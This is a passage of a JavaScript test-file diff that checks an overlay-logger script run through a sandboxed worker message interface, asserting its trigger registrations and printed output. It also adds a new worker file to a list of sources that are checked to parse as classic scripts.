+            if (predicate()) return;
+            await new Promise((resolve) => setImmediate(resolve));
+        }
+        throw new Error(`overlay script stalled: ${messages.map((message) => message.type).join(",")}`);
+    };
+
+    let startupComplete = false;
+    const startup = listeners.get("message")({
+        data: { type: "start", code: overlaySource, shortcuts: [] }
+    }).then(() => { startupComplete = true; });
+    await drainUntil(() => startupComplete);
+    await startup;
+
+    const registrations = messages.filter((message) => message.type === "register");
+    assert.deepEqual(registrations.map((message) => [message.trigger.kind, message.trigger.address]), [
+        ["exec", 0x020a36b8],
+        ["exec", 0x020a392c],
+        ["tick", 0]
+    ]);
+    const startupPrint = messages.filter((message) => message.type === "print")
+        .flatMap((message) => message.values.map(String));
+    assert.ok(startupPrint.includes("slot 0: id 2 start 0x02000000"));
+    assert.ok(startupPrint.includes("overlay logger registered; press the original button chord to toggle output"));
+
+    const runEvent = async (registration, eventId, event, payload = {}) => {
+        void listeners.get("message")({
+            data: {
+                type: "event", event, eventId,
+                callbackId: registration.trigger.callbackId,
+                callbackToken: `overlay-callback-${eventId}`,
+                payload
+            }
+        });
+        await drainUntil(() => messages.some((message) => (
+            message.type === "eventDone" && message.eventId === eventId
+        )));
+    };
+
+    await runEvent(registrations[0], 91, "exec");
+    await runEvent(registrations[1], 92, "exec");
+    buttonValue = 7;
+    await runEvent(registrations[2], 93, "tick", { frame: 60 });
+
+    const allPrint = messages.filter((message) => message.type === "print")
+        .flatMap((message) => message.values.map(String));
+    assert.ok(allPrint.includes("overlay loaded: slot 3, id 2, start 0x02000000, caller: 0x11111111"));
+    assert.ok(allPrint.includes("overlay unloaded: slot 0x00000003, id 2"));
+    assert.ok(allPrint.includes("overlay log disabled"));
+    assert.equal(messages.filter((message) => message.type === "call" && message.command === "resume").length, 2);
+    assert.equal(messages.some((message) => message.type === "failed"), false);
 });
 
 async function runEvalSupervisor(childMessage) {
@@ -898,7 +1578,8 @@ test("all supervisor and sandbox Worker sources parse as classic scripts", async
         "../src/workers/eval-supervisor.worker.js",
         "../src/workers/eval.worker.js",
         "../src/workers/persistent-script-supervisor.worker.js",
-        "../src/workers/persistent-script.worker.js"
+        "../src/workers/persistent-script.worker.js",
+        "../src/workers/algorithm.worker.js"
     ]) {
         const source = await readFile(new URL(path, import.meta.url), "utf8");
         assert.doesNotThrow(() => Function(source), path);
